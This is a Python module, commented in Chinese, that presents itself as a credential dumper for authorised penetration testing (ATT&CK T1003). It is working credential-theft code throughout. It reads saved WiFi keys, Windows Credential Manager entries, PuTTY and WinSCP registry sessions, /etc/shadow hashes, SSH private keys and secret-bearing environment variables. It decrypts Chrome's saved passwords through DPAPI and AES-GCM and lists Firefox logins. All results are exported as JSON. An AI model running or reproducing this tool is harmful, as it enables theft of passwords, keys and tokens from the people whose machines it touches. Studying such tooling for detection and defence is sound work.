# -*- coding: utf-8 -*-
"""
凭证提取模块 (Credential Dumper)
ATT&CK Technique: T1003 - OS Credential Dumping

纯Python实现的凭证提取工具,支持:
- Windows: SAM/LSA/DPAPI/浏览器/WiFi
- Linux: /etc/shadow/SSH密钥/浏览器
- 跨平台: 内存中凭证搜索

注意: 仅用于授权的渗透测试和安全研究
"""

import logging

logger = logging.getLogger(__name__)

import base64
import json
import os
import platform
import re
import sqlite3
import tempfile
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List

# 条件导入
try:
    import winreg

    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

try:
    from Cryptodome.Cipher import AES

    HAS_CRYPTO = True
except ImportError:
    try:
        from Crypto.Cipher import AES

        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False


class CredentialType(Enum):
    """凭证类型"""

    PASSWORD = "password"
    HASH = "hash"
    TOKEN = "token"
    PRIVATE_KEY = "private_key"
    CERTIFICATE = "certificate"
    COOKIE = "cookie"
    WIFI = "wifi"
    BROWSER = "browser"
    DATABASE = "database"
    API_KEY = "api_key"
    SSH_KEY = "ssh_key"


@dataclass
class Credential:
    """凭证数据结构"""

    cred_type: CredentialType
    source: str
    username: str = ""
    password: str = ""
    domain: str = ""
    host: str = ""
    url: str = ""
    extra: Dict[str, Any] = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        return {
            "type": self.cred_type.value,
            "source": self.source,
            "username": self.username,
            "password": (
                self.password if len(self.password) < 100 else f"{self.password[:50]}...[TRUNCATED]"
            ),
            "domain": self.domain,
            "host": self.host,
            "url": self.url,
            "extra": self.extra,
            "timestamp": self.timestamp,
        }


@dataclass
class DumpResult:
    """提取结果"""

    success: bool
    source: str
    credentials: List[Credential] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "source": self.source,
            "count": len(self.credentials),
            "credentials": [c.to_dict() for c in self.credentials],
            "error": self.error,
        }


class CredentialDumper:
    """
    凭证提取器

    支持多种凭证源的提取,纯Python实现
    """

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.os_type = platform.system().lower()
        self.credentials: List[Credential] = []

    def _log(self, message: str):
        """日志输出"""
        if self.verbose:
            logger.debug(f"[CredDump] {message}")

    # ==================== Windows凭证提取 ====================

    def dump_windows_wifi(self) -> DumpResult:
        """
        提取Windows WiFi密码
        使用netsh命令 (无需管理员权限查看已保存的配置)
        """
        if self.os_type != "windows":
            return DumpResult(False, "wifi", error="仅支持Windows")

        credentials = []
        try:
            import subprocess

            # 获取WiFi配置列表
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=30
            )

            # 解析配置名称
            profiles = re.findall(
                r"所有用户配置文件\s*:\s*(.+)|All User Profile\s*:\s*(.+)",
                result.stdout,
                re.IGNORECASE,
            )

            for profile_match in profiles:
                profile = profile_match[0] or profile_match[1]
                profile = profile.strip()
                if not profile:
                    continue

                # 获取密码
                try:
                    detail = subprocess.run(
                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )

                    # 提取密码
                    key_match = re.search(
                        r"关键内容\s*:\s*(.+)|Key Content\s*:\s*(.+)", detail.stdout, re.IGNORECASE
                    )

                    if key_match:
                        password = (key_match.group(1) or key_match.group(2)).strip()
                        cred = Credential(
                            cred_type=CredentialType.WIFI,
                            source="Windows WiFi",
                            username=profile,
                            password=password,
                            extra={"security_type": "WPA/WPA2"},
                        )
                        credentials.append(cred)
                        self._log(f"Found WiFi: {profile}")
                except subprocess.TimeoutExpired:
                    continue

            return DumpResult(True, "wifi", credentials)

        except Exception as e:
            return DumpResult(False, "wifi", error=str(e))

    def dump_windows_vault(self) -> DumpResult:
        """
        提取Windows凭据管理器
        使用vaultcmd或cmdkey
        """
        if self.os_type != "windows":
            return DumpResult(False, "vault", error="仅支持Windows")

        credentials = []
        try:
            import subprocess

            # 使用cmdkey列出凭据
            result = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True, timeout=30)

            # 解析凭据
            current_target = None
            current_user = None

            for line in result.stdout.split("\n"):
                line = line.strip()

                target_match = re.search(r"目标:\s*(.+)|Target:\s*(.+)", line, re.IGNORECASE)
                if target_match:
                    current_target = (target_match.group(1) or target_match.group(2)).strip()

                user_match = re.search(r"用户:\s*(.+)|User:\s*(.+)", line, re.IGNORECASE)
                if user_match:
                    current_user = (user_match.group(1) or user_match.group(2)).strip()

                if current_target and current_user:
                    cred = Credential(
                        cred_type=CredentialType.PASSWORD,
                        source="Windows Credential Manager",
                        username=current_user,
                        host=current_target,
                        extra={"note": "密码需要DPAPI解密或mimikatz提取"},
                    )
                    credentials.append(cred)
                    self._log(f"Found credential: {current_user}@{current_target}")
                    current_target = None
                    current_user = None

            return DumpResult(True, "vault", credentials)

        except Exception as e:
            return DumpResult(False, "vault", error=str(e))

    def dump_windows_registry_secrets(self) -> DumpResult:
        """
        从注册表提取保存的凭证
        包括: Putty、WinSCP、FileZilla等
        """
        if not HAS_WINREG:
            return DumpResult(False, "registry", error="winreg模块不可用")

        credentials = []

        # PuTTY Sessions
        try:
            putty_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions"
            )

            i = 0
            while True:
                try:
                    session_name = winreg.EnumKey(putty_key, i)
                    session_key = winreg.OpenKey(putty_key, session_name)

                    host = ""
                    user = ""
                    try:
                        host = winreg.QueryValueEx(session_key, "HostName")[0]
                        user = winreg.QueryValueEx(session_key, "UserName")[0]
                    except Exception as exc:
                        logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

                    if host:
                        cred = Credential(
                            cred_type=CredentialType.PASSWORD,
                            source="PuTTY",
                            username=user,
                            host=host,
                            extra={"session": session_name},
                        )
                        credentials.append(cred)
                        self._log(f"Found PuTTY session: {session_name}")

                    winreg.CloseKey(session_key)
                    i += 1
                except OSError:
                    break

            winreg.CloseKey(putty_key)
        except Exception as exc:
            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        # WinSCP
        try:
            winscp_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions"
            )

            i = 0
            while True:
                try:
                    session_name = winreg.EnumKey(winscp_key, i)
                    session_key = winreg.OpenKey(winscp_key, session_name)

                    host = ""
                    user = ""
                    password = ""
                    try:
                        host = winreg.QueryValueEx(session_key, "HostName")[0]
                        user = winreg.QueryValueEx(session_key, "UserName")[0]
                        password = winreg.QueryValueEx(session_key, "Password")[0]
                    except Exception as exc:
                        logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

                    if host:
                        cred = Credential(
                            cred_type=CredentialType.PASSWORD,
                            source="WinSCP",
                            username=user,
                            password=password if password else "[encrypted]",
                            host=host,
                            extra={"session": session_name, "encrypted": bool(password)},
                        )
                        credentials.append(cred)
                        self._log(f"Found WinSCP session: {session_name}")

                    winreg.CloseKey(session_key)
                    i += 1
                except OSError:
                    break

            winreg.CloseKey(winscp_key)
        except Exception as exc:
            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        return DumpResult(True, "registry", credentials)

    # ==================== Linux凭证提取 ====================

    def dump_linux_shadow(self) -> DumpResult:
        """
        读取 /etc/shadow 文件 (需要root权限)
        """
        if self.os_type != "linux":
            return DumpResult(False, "shadow", error="仅支持Linux")

        credentials = []
        shadow_path = "/etc/shadow"

        try:
            with open(shadow_path, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 2 and parts[1] and parts[1] not in ["*", "!", "!!"]:
                        cred = Credential(
                            cred_type=CredentialType.HASH,
                            source="/etc/shadow",
                            username=parts[0],
                            password=parts[1],
                            extra={
                                "hash_type": self._identify_hash_type(parts[1]),
                                "last_change": parts[2] if len(parts) > 2 else "",
                            },
                        )
                        credentials.append(cred)
                        self._log(f"Found shadow entry: {parts[0]}")

            return DumpResult(True, "shadow", credentials)

        except PermissionError:
            return DumpResult(False, "shadow", error="需要root权限")
        except Exception as e:
            return DumpResult(False, "shadow", error=str(e))

    def _identify_hash_type(self, hash_str: str) -> str:
        """识别hash类型"""
        if hash_str.startswith("$1$"):
            return "MD5"
        elif hash_str.startswith("$5$"):
            return "SHA-256"
        elif hash_str.startswith("$6$"):
            return "SHA-512"
        elif hash_str.startswith("$y$"):
            return "yescrypt"
        elif hash_str.startswith("$2"):
            return "bcrypt"
        return "unknown"

    def dump_ssh_keys(self) -> DumpResult:
        """
        搜索SSH私钥
        """
        credentials = []

        # 常见SSH密钥位置
        ssh_paths = []

        if self.os_type == "windows":
            user_home = os.environ.get("USERPROFILE", "")
            ssh_paths = [
                os.path.join(user_home, ".ssh"),
                os.path.join(user_home, "Documents", ".ssh"),
            ]
        else:
            user_home = os.environ.get("HOME", "")
            ssh_paths = [
                os.path.join(user_home, ".ssh"),
                "/root/.ssh",
                "/etc/ssh",
            ]

        key_patterns = ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "*.pem", "*.key"]

        for ssh_path in ssh_paths:
            if not os.path.exists(ssh_path):
                continue

            try:
                for item in os.listdir(ssh_path):
                    item_path = os.path.join(ssh_path, item)
                    if not os.path.isfile(item_path):
                        continue

                    # 检查是否为私钥
                    is_key = any(
                        item == pattern or (pattern.startswith("*") and item.endswith(pattern[1:]))
                        for pattern in key_patterns
                    )

                    if not is_key and not item.endswith(".pub"):
                        # 检查文件内容
                        try:
                            with open(item_path, "r", encoding="utf-8", errors="replace") as f:
                                first_line = f.readline()
                                if "PRIVATE KEY" in first_line:
                                    is_key = True
                        except (IOError, OSError, PermissionError):
                            continue

                    if is_key:
                        try:
                            with open(item_path, "r", encoding="utf-8", errors="replace") as f:
                                content = f.read()

                            # 检查是否加密
                            is_encrypted = "ENCRYPTED" in content

                            cred = Credential(
                                cred_type=CredentialType.SSH_KEY,
                                source=item_path,
                                username=item,
                                password=content[:500] + "..." if len(content) > 500 else content,
                                extra={
                                    "encrypted": is_encrypted,
                                    "key_type": self._identify_key_type(content),
                                },
                            )
                            credentials.append(cred)
                            self._log(f"Found SSH key: {item_path}")
                        except (IOError, OSError, PermissionError):
                            continue

            except PermissionError:
                continue

        return DumpResult(True, "ssh_keys", credentials)

    def _identify_key_type(self, content: str) -> str:
        """识别SSH密钥类型"""
        if "RSA" in content:
            return "RSA"
        elif "DSA" in content:
            return "DSA"
        elif "EC" in content:
            return "ECDSA"
        elif "OPENSSH" in content:
            return "OpenSSH (ed25519)"
        return "unknown"

    # ==================== 浏览器凭证提取 ====================

    def dump_chrome_passwords(self) -> DumpResult:
        """
        提取Chrome浏览器保存的密码
        注意: Windows上密码使用DPAPI加密, 需要在同一用户下运行
        """
        credentials = []

        # Chrome配置文件路径
        if self.os_type == "windows":
            base_path = os.path.join(
                os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"
            )
        elif self.os_type == "darwin":
            base_path = os.path.expanduser("~/Library/Application Support/Google/Chrome")
        else:
            base_path = os.path.expanduser("~/.config/google-chrome")

        if not os.path.exists(base_path):
            return DumpResult(False, "chrome", error="Chrome配置目录不存在")

        # 查找Login Data文件
        login_db_paths = []
        for root, dirs, files in os.walk(base_path):
            if "Login Data" in files:
                login_db_paths.append(os.path.join(root, "Login Data"))

        for db_path in login_db_paths:
            try:
                # 复制数据库 (Chrome可能锁定原文件)
                temp_db = os.path.join(tempfile.gettempdir(), f"chrome_login_{os.getpid()}.db")
                import shutil

                shutil.copy2(db_path, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("""
                    SELECT origin_url, username_value, password_value
                    FROM logins
                """)

                for row in cursor.fetchall():
                    url, username, encrypted_password = row

                    if not username:
                        continue

                    # 尝试解密密码 (Windows DPAPI)
                    password = "[encrypted - DPAPI]"
                    if self.os_type == "windows" and encrypted_password:
                        password = self._decrypt_chrome_password(encrypted_password, base_path)

                    cred = Credential(
                        cred_type=CredentialType.BROWSER,
                        source="Chrome",
                        username=username,
                        password=password,
                        url=url,
                        extra={"profile": os.path.dirname(db_path)},
                    )
                    credentials.append(cred)
                    self._log(f"Found Chrome password: {username}@{url}")

                conn.close()
                os.remove(temp_db)

            except Exception as e:
                self._log(f"Chrome extraction error: {e}")
                continue

        return DumpResult(True, "chrome", credentials)

    def _decrypt_chrome_password(self, encrypted: bytes, chrome_path: str) -> str:
        """
        解密Chrome密码 (Windows DPAPI)
        Chrome 80+ 使用 AES-GCM 加密
        """
        try:
            # Chrome 80+ 使用 Local State 中的密钥
            local_state_path = os.path.join(chrome_path, "Local State")

            if not os.path.exists(local_state_path):
                return "[encrypted]"

            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            # 获取加密密钥
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

            # 移除 'DPAPI' 前缀
            encrypted_key = encrypted_key[5:]

            # 使用 Windows DPAPI 解密密钥
            import ctypes
            import ctypes.wintypes

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [
                    ("cbData", ctypes.wintypes.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_char)),
                ]

            def decrypt_dpapi(encrypted_data):
                input_blob = DATA_BLOB(
                    len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_char))
                )
                output_blob = DATA_BLOB()

                if ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(input_blob), None, None, None, None, 0, ctypes.byref(output_blob)
                ):
                    decrypted = ctypes.string_at(output_blob.pbData, output_blob.cbData)
                    ctypes.windll.kernel32.LocalFree(output_blob.pbData)
                    return decrypted
                return None

            key = decrypt_dpapi(encrypted_key)

            if not key or not HAS_CRYPTO:
                return "[encrypted - need pycryptodome]"

            # 解密密码
            # Chrome 使用 AES-256-GCM
            # 格式: 'v10' + nonce(12) + ciphertext + tag(16)
            if encrypted[:3] == b"v10":
                nonce = encrypted[3:15]
                ciphertext = encrypted[15:-16]
                tag = encrypted[-16:]

                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode("utf-8")
            else:
                # 旧版本直接使用 DPAPI
                result = decrypt_dpapi(encrypted)
                return result.decode("utf-8") if result else "[decrypt failed]"

        except Exception as e:
            return f"[decrypt error: {str(e)[:50]}]"

    def dump_firefox_passwords(self) -> DumpResult:
        """
        提取Firefox浏览器保存的密码
        注意: Firefox使用NSS加密,解密较复杂
        """
        credentials = []

        # Firefox配置文件路径
        if self.os_type == "windows":
            base_path = os.path.join(
                os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles"
            )
        elif self.os_type == "darwin":
            base_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
        else:
            base_path = os.path.expanduser("~/.mozilla/firefox")

        if not os.path.exists(base_path):
            return DumpResult(False, "firefox", error="Firefox配置目录不存在")

        # 遍历配置文件
        for profile in os.listdir(base_path):
            profile_path = os.path.join(base_path, profile)
            logins_path = os.path.join(profile_path, "logins.json")

            if not os.path.exists(logins_path):
                continue

            try:
                with open(logins_path, "r", encoding="utf-8") as f:
                    logins_data = json.load(f)

                for login in logins_data.get("logins", []):
                    cred = Credential(
                        cred_type=CredentialType.BROWSER,
                        source="Firefox",
                        username=login.get("encryptedUsername", "[encrypted]"),
                        password="[NSS encrypted - use firefox_decrypt tool]",
                        url=login.get("hostname", ""),
                        extra={
                            "profile": profile,
                            "guid": login.get("guid", ""),
                            "note": "使用 firefox_decrypt 或 firepwd 解密",
                        },
                    )
                    credentials.append(cred)
                    self._log(f"Found Firefox login: {login.get('hostname', '')}")

            except Exception as e:
                self._log(f"Firefox extraction error: {e}")
                continue

        return DumpResult(True, "firefox", credentials)

    # ==================== 环境变量和配置文件 ====================

    def dump_environment_secrets(self) -> DumpResult:
        """
        从环境变量提取可能的凭证
        """
        credentials = []

        # 敏感环境变量关键字
        sensitive_keywords = [
            "PASSWORD",
            "PASSWD",
            "PWD",
            "SECRET",
            "TOKEN",
            "API_KEY",
            "APIKEY",
            "AUTH",
            "CREDENTIAL",
            "AWS_",
            "AZURE_",
            "GCP_",
            "GITHUB_",
            "GITLAB_",
            "DATABASE_URL",
            "DB_",
            "MONGO",
            "REDIS",
            "MYSQL",
            "PRIVATE_KEY",
            "SSH_",
            "GPG_",
        ]

        for key, value in os.environ.items():
            for keyword in sensitive_keywords:
                if keyword in key.upper():
                    # 过滤明显不是凭证的值
                    if value and len(value) > 3 and not value.startswith("/"):
                        cred = Credential(
                            cred_type=CredentialType.API_KEY,
                            source="Environment Variable",
                            username=key,
                            password=value[:100] + "..." if len(value) > 100 else value,
                            extra={"full_length": len(value)},
                        )
                        credentials.append(cred)
                        self._log(f"Found env secret: {key}")
                    break

        return DumpResult(True, "environment", credentials)

    # ==================== 统一提取接口 ====================

    def dump_all(self, categories: List[str] = None) -> Dict[str, DumpResult]:
        """
        执行所有凭证提取

        Args:
            categories: 要提取的类别列表,None表示全部
                       可选: wifi, vault, registry, shadow, ssh, chrome, firefox, env
        """
        results = {}

        all_methods = {
            "wifi": self.dump_windows_wifi,
            "vault": self.dump_windows_vault,
            "registry": self.dump_windows_registry_secrets,
            "shadow": self.dump_linux_shadow,
            "ssh": self.dump_ssh_keys,
            "chrome": self.dump_chrome_passwords,
            "firefox": self.dump_firefox_passwords,
            "env": self.dump_environment_secrets,
        }

        # 选择要执行的方法
        if categories:
            methods = {k: v for k, v in all_methods.items() if k in categories}
        else:
            methods = all_methods

        for name, method in methods.items():
            try:
                self._log(f"Dumping {name}...")
                result = method()
                results[name] = result
                self.credentials.extend(result.credentials)
            except Exception as e:
                results[name] = DumpResult(False, name, error=str(e))

        return results

    def export_json(self, output_path: str = None) -> str:
        """
        导出所有凭证为JSON
        """
        data = {
            "timestamp": datetime.now().isoformat(),
            "host": platform.node(),
            "os": self.os_type,
            "total": len(self.credentials),
            "credentials": [c.to_dict() for c in self.credentials],
        }

        if output_path:
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            return output_path
        else:
            return json.dumps(data, indent=2, ensure_ascii=False)


# 便捷函数
def dump_credentials(categories: List[str] = None, verbose: bool = False) -> Dict[str, Any]:
    """
    凭证提取便捷函数

    Args:
        categories: 要提取的类别 (wifi/vault/registry/shadow/ssh/chrome/firefox/env)
        verbose: 是否输出详细日志

    Returns:
        提取结果字典
    """
    dumper = CredentialDumper(verbose=verbose)
    results = dumper.dump_all(categories)

    return {
        "total_credentials": len(dumper.credentials),
        "results": {k: v.to_dict() for k, v in results.items()},
    }


if __name__ == "__main__":
    # 测试
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    logger.info("=== Credential Dumper Test ===")
    dumper = CredentialDumper(verbose=True)

    # 只测试安全的提取方法
    results = dumper.dump_all(["env", "ssh"])

    logger.info(f"Total credentials found: {len(dumper.credentials)}")
    logger.info(dumper.export_json())
